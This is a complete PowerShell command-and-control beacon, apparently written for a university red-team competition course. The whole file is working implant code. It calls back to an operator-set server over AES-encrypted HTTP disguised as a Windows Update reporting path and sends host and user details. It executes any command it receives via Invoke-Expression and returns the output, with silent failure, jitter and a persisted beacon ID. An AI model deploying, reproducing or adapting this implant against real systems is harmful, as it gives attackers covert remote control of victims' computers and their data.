# Phantom C2 Implant - Windows PowerShell Beacon
# Author: Koy Monette kfm9123@rit.edu
# Course: CSEC-473 Cyber Defense Techniques
# Purpose: Red Team implant for authorized competition use only
#
# This implant connects back to the C2 server, receives commands,
# executes them, and returns results. Uses AES encryption for all comms.
#
# USAGE: powershell.exe -ExecutionPolicy Bypass -File beacon.ps1

param(
    [string]$ServerUrl = "http://YOUR_IP:8080",
    [string]$ServerKey = "a1b2c3..."
)

# Configuration
$global:Config = @{
    ServerUrl = $ServerUrl
    ServerKey = $ServerKey
    BeaconId = $null
    BeaconIdFile = "$env:TEMP\phantom_beacon_id.txt"  # ADD THIS LINE
    MinInterval = 30
    MaxInterval = 60
    MaxRetries = 5
}

# Convert hex key to bytes
function ConvertFrom-HexString {
    param([string]$HexString)
    $bytes = New-Object byte[] ($HexString.Length / 2)
    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
        $bytes[$i / 2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    return $bytes
}

# AES Encryption (matches server implementation)
function Encrypt-Data {
    param([string]$PlainText, [byte[]]$Key)
    
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        
        $encryptor = $aes.CreateEncryptor()
        $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
        
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($plainBytes, 0, $plainBytes.Length)
        $cs.FlushFinalBlock()
        
        $encrypted = $ms.ToArray()
        
        # Combine IV + ciphertext
        $result = New-Object byte[] ($aes.IV.Length + $encrypted.Length)
        [Array]::Copy($aes.IV, $result, $aes.IV.Length)
        [Array]::Copy($encrypted, 0, $result, $aes.IV.Length, $encrypted.Length)
        
        $cs.Dispose()
        $ms.Dispose()
        $aes.Dispose()
        
        return [Convert]::ToBase64String($result)
    }
    catch {
        # Silent failure - no output
        return $null
    }
}

# AES Decryption
function Decrypt-Data {
    param([string]$EncryptedText, [byte[]]$Key)
    
    try {
        $encryptedBytes = [Convert]::FromBase64String($EncryptedText)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $iv = New-Object byte[] 16
        [Array]::Copy($encryptedBytes, $iv, 16)
        $aes.IV = $iv
        
        $ciphertext = New-Object byte[] ($encryptedBytes.Length - 16)
        [Array]::Copy($encryptedBytes, 16, $ciphertext, 0, $ciphertext.Length)
        
        
        $decryptor = $aes.CreateDecryptor()
        
        # FIX: Create MemoryStream with byte array properly
        $ms = New-Object System.IO.MemoryStream -ArgumentList @(,$ciphertext)
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $sr = New-Object System.IO.StreamReader($cs)
        
        $decrypted = $sr.ReadToEnd()
        
        $sr.Dispose()
        $cs.Dispose()
        $ms.Dispose()
        $aes.Dispose()
        
        return $decrypted
    }
    catch {
        # Silent failure - no output
        return $null
    }
}

# Gather system information
function Get-SystemInfo {
    try {
        $hostname = $env:COMPUTERNAME
        $username = $env:USERNAME
        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        if (-not $os) {
            $os = "Windows"
        }
        
        return @{
            hostname = $hostname
            username = $username
            os = $os
        }
    }
    catch {
        return @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = "Windows"
        }
    }
}

# Execute command and capture output
function Invoke-CommandExec {
    param([string]$Command)
    
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        
        if ($output.Length -gt 10000) {
            $output = $output.Substring(0, 10000) + "`n... output truncated ..."
        }
        
        if ([string]::IsNullOrWhiteSpace($output)) {
            $output = "Command completed with no output"
        }
        
        return $output.Trim()
    }
    catch {
        $errorMsg = "Error executing command: $($_.Exception.Message)"
        Write-Host "ERROR: $errorMsg" -ForegroundColor Red
        return $errorMsg
    }
}

# Send check-in to C2 server
function Send-Checkin {
    param([array]$Results = @())
    
    try {
        # Load beacon ID from file if it exists
        if (-not $global:Config.BeaconId -and (Test-Path $global:Config.BeaconIdFile)) {
            $global:Config.BeaconId = (Get-Content $global:Config.BeaconIdFile -Raw).Trim()
        }
        
        $sysInfo = Get-SystemInfo
        
        $payload = @{
            hostname = $sysInfo.hostname
            username = $sysInfo.username
            os = $sysInfo.os
            beacon_id = $global:Config.BeaconId
            results = $Results
        } | ConvertTo-Json -Compress -Depth 10
        
        $keyBytes = ConvertFrom-HexString -HexString $global:Config.ServerKey
        $encrypted = Encrypt-Data -PlainText $payload -Key $keyBytes
        
        if (-not $encrypted) {
            return $null
        }
        
        $url = "$($global:Config.ServerUrl)/windowsupdate/v6/reporting"
        
        $response = Invoke-RestMethod -Uri $url -Method POST -Body $encrypted -ContentType "text/plain" -TimeoutSec 10
        
        if ($response) {
            $decrypted = Decrypt-Data -EncryptedText $response -Key $keyBytes
            
            if ($decrypted) {
                $data = $decrypted | ConvertFrom-Json
                
                # Save beacon ID if this is first registration
                if (-not $global:Config.BeaconId -and $data.beacon_id) {
                    $global:Config.BeaconId = $data.beacon_id
                    # Save to file for persistence
                    $global:Config.BeaconId | Out-File -FilePath $global:Config.BeaconIdFile -Force -NoNewline
                }
                
                return $data
            }
        }
        
        return $null
    }
    catch {
        # Silent failure - no output
        return $null
    }
}

# Main beacon loop
function Start-Beacon { 
    $retryCount = 0
    $results = @()
    
    while ($true) {
        try {
            $response = Send-Checkin -Results $results
            
            if ($response) {
                $retryCount = 0
                
                # Clear results after successful send
                if ($results.Count -gt 0) {
                    $results = @()
                }
                
                # Process commands from C2
                if ($response.commands -and $response.commands.Count -gt 0) {
                    
                    foreach ($cmd in $response.commands) {
                        # Check for exit command
                        if ($cmd.cmd -eq "exit" -or $cmd.cmd -eq "quit") {
                            # Clean up beacon ID file
                            if (Test-Path $global:Config.BeaconIdFile) {
                                Remove-Item $global:Config.BeaconIdFile -Force
                            }
                            exit 0
                        }
                        
                        # Execute command
                        $output = Invoke-CommandExec -Command $cmd.cmd
                        
                        # Store result for next check-in
                        $result = @{
                            cmd = $cmd.cmd
                            output = $output
                            timestamp = [int][double]::Parse((Get-Date -UFormat %s))
                            cmd_id = $cmd.id
                        }
                        
                        $results += $result
                    }
                }
                
                # Use server-provided interval with jitter
                $sleepTime = if ($response.interval) { 
                    $response.interval 
                } else { 
                    Get-Random -Minimum $global:Config.MinInterval -Maximum $global:Config.MaxInterval 
                }
                
                Start-Sleep -Seconds $sleepTime
            }
            else {
                # Check-in failed, retry with backoff
                $retryCount++
                
                if ($retryCount -gt $global:Config.MaxRetries) {
                    exit 1
                }
                
                $backoff = [Math]::Min(300, 30 * $retryCount)
                Start-Sleep -Seconds $backoff
            }
        }
        catch {
            # Silent failure - no output
            $retryCount++
            
            if ($retryCount -gt $global:Config.MaxRetries) {
                exit 1
            }
            
            Start-Sleep -Seconds 60
        }
    }
}

# Validate configuration
if ($global:Config.ServerUrl -eq "http://YOUR_C2_SERVER:8080") {
    # Configuration error - exit silently
    exit 1
}

# Start the beacon
Start-Beacon